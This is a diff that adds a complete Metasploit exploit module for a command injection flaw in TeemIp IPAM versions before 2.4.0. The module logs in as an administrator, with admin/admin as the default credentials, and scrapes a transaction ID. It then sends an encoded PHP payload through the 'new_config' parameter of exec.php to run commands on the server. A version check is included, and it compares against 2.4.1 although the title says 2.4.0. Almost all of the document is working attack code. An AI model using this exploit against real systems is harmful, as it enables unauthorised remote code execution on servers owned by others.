@@ -1,0 +1,152 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name' => "TeemIp IPAM < 2.4.0 - 'new_config' Command Injection",
+      'Description' => %q(
+        This module exploits a command injection vulnerability in TeemIp
+        versions prior to 2.4.0. The "new_config" parameter of "exec.php" 
+        allows you to create a new PHP file with the exception of config information.
+
+        The malicious PHP code sent is executed instantaneously and is not saved on the server.
+        The vulnerability can be exploited by an authorized user (Administrator).
+        Module allows remote command execution by sending php payload with parameter 'new_config'.
+
+      ),
+      'License' => MSF_LICENSE,
+      'Author' =>
+        [
+          'AkkuS <Özkan Mustafa Akkuş>', # Discovery & PoC & Metasploit module
+        ],
+      'References' =>
+        [
+          ['URL', 'http://pentest.com.tr/exploits/TeemIp-IPAM-2-4-0-new-config-Command-Injection-Metasploit.html']
+        ],
+      'Platform' => 'php',
+      'Arch' => ARCH_PHP,
+      'Targets' => [['Automatic', {}]],
+      'Privileged' => false,
+      'DisclosureDate' => "Apr 03 2019",
+      'DefaultTarget' => 0))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, "Base TeemIp IPAM directory path", '/6']),
+        OptString.new('USERNAME', [true, "Username to authenticate with", 'admin']),
+        OptString.new('PASSWORD', [false, "Password to authenticate with", 'admin'])
+      ]
+    )
+  end
+##
+# Login and cookie information gathering
+##
+  def do_login
+
+    res = send_request_cgi(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'pages', 'UI.php'),
+      'vars_post' => {
+        'auth_user' => datastore['username'],
+        'auth_pwd' => datastore['password'],
+        'loginop' => 'login'
+      }
+    )
+
+    unless res
+      fail_with(Failure::Unreachable, 'Connection error occurred!')
+    end
+
+    if res.code == 200 && (res.body =~ /Logged in as/)
+      print_good("Authentication was successful")
+      @cookies = res.get_cookies
+      return 
+    else
+      fail_with(Failure::NoAccess, 'Authentication was unsuccessful')     
+    end  
+  end
+
+  def peer
+    "#{ssl ? 'https://' : 'http://' }#{rhost}:#{rport}"
+  end
+##
+# Exploitation process with prepared information
+##
+  def exploit
+    unless Exploit::CheckCode::Appears == check
+      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
+    end
+
+    @cookies = nil
+    do_login
+
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri, 'pages', 'exec.php?exec_module=itop-config&exec_page=config.php&exec_env=production&c%5Bmenu%5D=ConfigEditor'),
+      'headers' => {
+        'Cookie' => @cookies
+      }
+    )
+
+    if res and res.code == 200 and res.body =~ /Identify yourself/
+      return do_login
+    else 
+      transid = res.body.split('transaction_id" value="')[1].split('"')[0]
+      print_good("transaction_id : #{transid}")
+    end
+
+    res = send_request_cgi(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri, 'pages', 'exec.php?exec_module=itop-config&exec_page=config.php&exec_env=production&c%5Bmenu%5D=ConfigEditor'),
+      'vars_post' => {
+          "operation" => "save",
+          "transaction_id" => transid,
+          "prev_config" => "exec",
+          "new_config" => payload.encoded
+       },
+      'headers' => {
+        'Cookie' => @cookies
+      }
+    )
+    handler
+
+  end
+##
+# Version and Vulnerability Check
+##
+  def check
+
+    res = send_request_cgi(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'pages', 'ajax.render.php'),
+      'vars_post' => {
+          "operation" => "about_box"
+      }
+    )
+
+    unless res
+      vprint_error 'Connection failed'
+      return CheckCode::Unknown
+    end
+
+    if res.code == 200
+      version = res.body.split('iTop version ')[1].split('" src=')[0]
+      if version < '2.4.1'
+       print_status("#{peer} - Teemip Version is #{version}")
+       return Exploit::CheckCode::Appears
+      end
+    end
+
+    return Exploit::CheckCode::Safe
+  end
+##
+# End
+##
+end
